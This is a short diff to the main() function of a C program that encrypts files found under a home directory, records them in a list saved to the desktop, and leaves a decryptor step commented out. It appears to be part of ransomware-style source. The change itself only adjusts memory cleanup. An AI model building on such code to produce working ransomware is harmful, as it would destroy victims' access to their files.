@@ -30,13 +30,15 @@ int main(){
 
     /* start encryption */
     encrypt_files(files, &encrypted, &not_encrypted);
+    destroy(&files);
     save_into_file_encrypted_list(encrypted, desktop);
-    //destroy(&encrypted);
+    destroy(&encrypted);
+
+    /* Decryptor */
     //read_from_file_encrypted_files(&encrypted, desktop);
     //print(encrypted);
-    //print(encrypted);
-    //destroy(&files);
-    //destroy_encrypted_list(&encrypted);
+    //decrypt_files(encrypted);
+    //destroy(&encrypted);
 
     /* Free the memory */
     free(home);
